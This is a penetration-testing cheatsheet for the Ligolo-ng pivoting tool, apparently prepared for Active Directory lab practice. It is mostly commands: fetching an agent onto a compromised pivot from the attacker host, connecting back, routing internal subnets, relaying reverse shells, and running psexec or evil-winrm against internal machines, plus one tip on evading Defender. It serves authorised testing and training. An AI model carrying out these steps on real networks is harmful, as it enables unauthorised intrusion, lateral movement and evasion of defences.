# Ligolo-ng Cheatsheet

> Modern pivoting tool — replaces SSH tunneling + proxychains. Gives your Kali tools NATIVE access to internal networks (no proxychains prefix). Primary pivoting tool for the AD set.

---

## Why Ligolo Over SSH Tunneling

- No proxychains — tools work natively (nmap, evil-winrm, impacket all just work)
- Faster and more stable than `ssh -D` / `ssh -R` dynamic forwarding
- Handles the "pivot connects back to you, reach whole subnet" case cleanly (where `ssh -R` dynamic notoriously fails)
- Creates a real network route via a tun interface

---

## Components

- **proxy** — runs on your Kali (the control server + console)
- **agent** — runs on the compromised pivot machine (connects back to the proxy)

Match the agent's OS/arch to the pivot: `agent` (Linux amd64), `agent.exe` (Windows), aarch64 variants, etc.

---

## One-Time Setup on Kali (tun interface)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

This creates the `ligolo` tun interface that internal traffic routes through. Only needed once per Kali session (recreate after reboot).

---

## Download Binaries (on Kali)

```bash
# Check latest version at github.com/nicocha30/ligolo-ng/releases
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_*.tar.gz
tar -xzf ligolo-ng_agent_*.tar.gz
```

For a Windows pivot, also grab the Windows agent:
```
ligolo-ng_agent_0.7.5_windows_amd64.zip  →  agent.exe
```

---

## Full Workflow

### 1. Start the proxy on Kali
```bash
./proxy -selfcert
```
Listens on port `11601` by default and drops you into the Ligolo console.

### 2. Transfer the agent to the pivot
```bash
# Serve from Kali
python3 -m http.server 80
```
```bash
# On the Linux pivot
wget http://<KALI_IP>/agent -O /tmp/agent
chmod +x /tmp/agent
```
```powershell
# On a Windows pivot
iwr -Uri http://<KALI_IP>/agent.exe -OutFile C:\Windows\Temp\agent.exe
```

### 3. Run the agent (connects back to Kali)
```bash
# Linux
/tmp/agent -connect <KALI_IP>:11601 -ignore-cert
```
```cmd
:: Windows
C:\Windows\Temp\agent.exe -connect <KALI_IP>:11601 -ignore-cert
```

### 4. In the Ligolo console (Kali), select the session
```
session
# choose the agent number (1)
```

### 5. See what networks the pivot can reach
```
ifconfig
```
Note the internal subnet (e.g. `10.4.249.0/24`).

### 6. Add a route on Kali to that subnet
```bash
# In a SEPARATE Kali terminal
sudo ip route add 10.4.249.0/24 dev ligolo
```

### 7. Start the tunnel in the Ligolo console
```
start
```

### 8. Use your tools natively — NO proxychains
```bash
nmap -sT -Pn 10.4.249.64
curl http://10.4.249.64
evil-winrm -i 10.4.249.64 -u user -p pass
impacket-psexec user:pass@10.4.249.64
smbclient -L //10.4.249.64
```

---

## Ligolo Console Commands

| Command | Purpose |
|---------|---------|
| `session` | Select an active agent session |
| `ifconfig` | Show the pivot's network interfaces (find internal subnets) |
| `start` | Start the tunnel for the selected session |
| `stop` | Stop the tunnel |
| `listener_add` | Add a port listener (for reverse shells through the pivot) |
| `listener_list` | List active listeners |
| `autoroute` | Auto-add routes (newer versions) |

---

## Catching Reverse Shells Through Ligolo

To catch a reverse shell FROM an internal machine (that can't reach Kali directly), set up a listener on the agent that forwards back to Kali:

```
# In Ligolo console
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

Then on Kali:
```bash
nc -lnvp 4444
```

Point the internal target's reverse shell at the **pivot's** IP on port 4444. Ligolo relays it to your Kali listener.

---

## Double Pivot (pivot through two machines)

When you compromise a machine deeper in the network and need to reach a third subnet:

1. Run a second agent on the second pivot, connecting back through the first tunnel
2. Add a route to the new subnet: `sudo ip route add <new_subnet> dev ligolo`
3. Select the new session and `start`

Ligolo handles chained pivots more cleanly than nested SSH tunnels.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `ligolo` interface missing | Re-run the `ip tuntap add` setup (lost on reboot) |
| Agent won't connect | Check `-ignore-cert` flag, confirm Kali IP/port, firewall |
| Tools still can't reach target | Confirm `sudo ip route add <subnet> dev ligolo` was run |
| Route added but no traffic | Did you run `start` in the console? |
| Wrong subnet | Run `ifconfig` in console to see actual reachable subnets |

---

## Key Notes

- **Always run `start`** in the console after selecting the session — adding the route alone isn't enough.
- **The route subnet must match** the pivot's internal network (check with `ifconfig` in the console).
- **Tools work natively** — never prefix with proxychains when using Ligolo.
- **tun interface is lost on reboot** — recreate with the `ip tuntap` commands.
- For a Windows pivot with Defender, the agent may be flagged — rename it or transfer to an excluded path.

---

## Quick Reference — Minimal Flow

```bash
# Kali - one time
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Kali - start proxy
./proxy -selfcert

# Pivot - run agent
./agent -connect <KALI_IP>:11601 -ignore-cert

# Ligolo console
session        # pick agent
ifconfig       # note internal subnet

# Kali - separate terminal
sudo ip route add <internal_subnet>/24 dev ligolo

# Ligolo console
start

# Kali - attack natively
nmap -sT -Pn <internal_target>
```

---

## Reference
- Ligolo-ng GitHub: https://github.com/nicocha30/ligolo-ng
